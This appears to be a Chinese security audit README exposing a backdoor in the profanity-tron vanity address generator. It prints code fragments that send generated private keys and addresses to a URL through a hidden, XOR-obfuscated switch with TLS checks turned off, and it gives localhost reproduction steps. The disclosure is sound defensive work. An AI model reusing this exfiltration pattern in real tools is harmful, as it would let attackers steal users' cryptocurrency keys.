<p align="center">

  <a href="#中文">🇨🇳 中文</a> •
  <a href="#english">🇺🇸 English</a> •
  <a href="#日本語">🇯🇵 日本語</a> •
  <a href="#한국어">🇰🇷 한국어</a> •
  <a href="#हिन्दी">🇮🇳 हिन्दी</a> •
  <a href="#español">🇪🇸 Español</a> •
  <a href="#العربية">🇸🇦 العربية</a> •
  <a href="#русский">🇷🇺 Русский</a>

</p>

# profanity-tron-后门盗u-实锤审计报告（针对profanity-tron源码）
# 注意！经其他作者举报，此作者已删库改名为：GenTronx  地址：https://github.com/GenTronx/gpu

以下作者均为一人：
<img width="2611" height="1521" alt="image" src="https://github.com/user-attachments/assets/e0e7bd37-26e7-473e-b256-1563d03c4ce8" />

审计范围1：https://github.com/sodasord/profanity-tron

审计范围2：https://github.com/sponsord/profanity-tron

审计范围3：2026年4月25换号：https://github.com/GenTronx/gpu<img width="2613" height="1731" alt="image" src="https://github.com/user-attachments/assets/7ee5f407-4c73-4199-9de7-607bceae01ff" />


看雪分析：https://bbs.kanxue.com/thread-289060.htm
<img width="2753" height="1731" alt="image" src="https://github.com/user-attachments/assets/a414fc55-4162-46d5-b038-6f1b05ebff2d" />
<img width="2608" height="1754" alt="image" src="https://github.com/user-attachments/assets/8cd71beb-f4cb-439a-bda5-e96215678fa6" />

结论摘要：本目录源码内**存在一条可将“生成的私钥 + 地址”通过网络发往任意 URL 的逻辑路径**，并且通过**未在帮助信息/README公开的隐藏参数**进行启用；同时该网络请求还存在 **TLS 校验被显式关闭** 等高风险实现。以上属于“上传私钥/暗桩接口”的明确证据。

---

## 1. 关键实锤：生成私钥后可外发（私钥明文出现在 URL 参数）

### 1.1 外发函数：`postResult(privateKey, address, postUrl)`

位置：[`Dispatcher.cpp:L378-L403`]

核心代码点：

- 将私钥与地址拼接到查询字符串：
  - `sendData = "privatekey=" + privateKey + "&address=" + address;`[`Dispatcher.cpp:L381`]
  - `sendUrl = postUrl + "?" + sendData;`[`Dispatcher.cpp:L382`]
- 使用 libcurl 发起网络请求：
  - `curl_easy_setopt(curl, CURLOPT_URL, sendUrl.c_str());`[`Dispatcher.cpp:L387`]

这意味着：只要 `postUrl` 被设置为非空字符串，程序就可以把**私钥（privatekey）与地址（address）**作为网络请求参数发送出去。

### 1.2 触发时机：每次命中结果都会调用上传逻辑

位置：[`Dispatcher.cpp:L405-L452`]

关键代码点：

- `printResult(...)` 生成并打印：
  - `strPrivate`（私钥）与 `strPublicTron`（地址）[`Dispatcher.cpp:L430-L443`]
- 若 `postUrl` 非空则调用 `postResult`：
  - `if(!postUrl.empty()) { postResult(strPrivate, strPublicTron, postUrl); }`[`Dispatcher.cpp:L449-L451`]

并且该 `printResult(...)` 会在发现结果后被调用：

- `printResult(..., m_outputFile, m_postUrl);`[`Dispatcher.cpp:L454-L482`]，尤其 [`L476`]

结论：**只要 `m_postUrl` 被设置为非空**，程序会在命中靓号结果时自动尝试外发 `privatekey` 与 `address`。

---

## 2. 关键实锤：存在隐藏参数用于注入上传 URL（help/README 未公开）

### 2.1 隐藏参数名被混淆构造为 `pptt`

位置：[`profanity.cpp:L163-L166`]

关键代码点：

- `_s` 初值为 `{113, 113, 117, 117, 0}`，即 ASCII `"qquu"`
- 循环对每个字符异或 `1`：`_s[_k] ^= 1;`[`profanity.cpp:L164`]
- 异或后字符串变为 `"pptt"`（因为 `'q'(113)^1='p'(112)`，`'u'(117)^1='t'(116)`）
- 注册命令行参数：
  - `argp.addSwitch('p', _s, __x9);`[`profanity.cpp:L165`]

因此，程序实际支持的参数为：

- 短参数：`-p <value>`
- 长参数：`--pptt <value>`

### 2.2 该隐藏参数直接作为 `Dispatcher` 的 `postUrl` 传入

位置：[`profanity.cpp:L307`]

关键代码点：

- `Dispatcher d(..., outputFile, __x9);`

同时在 `Dispatcher` 定义中确实存在 `m_postUrl` 字段（表明这是一个“设计过的外部输入通道”）：

- `std::string m_postUrl;`[`Dispatcher.hpp:L116-L117`]

### 2.3 help/README 未披露该参数（隐藏性证据）

`help.hpp` 仅列出 `--output/--matching/...` 等，没有 `--pptt` 或 `-p`：

- [`help.hpp`]

`README.md` 的命令介绍同样未出现该参数：

- [`README.md`]

结论：这里不是“正常公开功能”，而是**通过混淆字符串 + 不在帮助文档中公开**的方式隐藏了一个“上传 URL 注入入口”。

---

## 3. 关键实锤：TLS 校验被显式关闭（即使是 HTTPS 也可能被中间人截获）

位置：[`Dispatcher.cpp:L387-L392`]

关键代码点：

- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);`[`Dispatcher.cpp:L390`]
- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);`[`Dispatcher.cpp:L391`]

这会导致：当 `postUrl` 是 `https://...` 时，客户端不会验证证书与主机名，存在被劫持、被代理、被伪造证书拦截的风险。

---

## 4. 如何复现（安全复现，不建议对外网使用）

目标：证明“参数可启用外发且包含 privatekey”。

1) 在本机起一个 HTTP 服务并记录访问日志（仅用于本机）  
2) 运行程序时加入隐藏参数，指向本机 URL，例如：

- `-p http://127.0.0.1:8080/collect`
- 或 `--pptt http://127.0.0.1:8080/collect`

当程序命中结果并打印 `Private:` 后，会发起一次对如下形式 URL 的访问（示例形态）：

- `http://127.0.0.1:8080/collect?privatekey=<hex>&address=<base58>`

对应构造路径见：[`Dispatcher.cpp:L381-L387`]。

---

## 5. 额外审计备注（可复现性/可信度）

在本目录可见 `Dispatcher::Device::createSeed()` 等函数在 `README` 被提及，但本目录源码中仅找到声明，未找到实现（至少在当前文件集合内未出现对应定义）。这会影响“源码可独立完整编译复现”的可信度与可审计性：

- 声明：[`Dispatcher.hpp:L36-L41`]

---

## 6. 风险结论

- 存在“私钥+地址外发”实现：**确认**
- 存在隐藏/混淆参数用于启用外发：**确认**
- 外发实现关闭 TLS 校验：**确认**

以上三点组合在一起，属于“生成密钥后上传等隐藏接口”的明确实锤。该逻辑不应出现在任何宣称“安全透明”的靓号生成器中。  

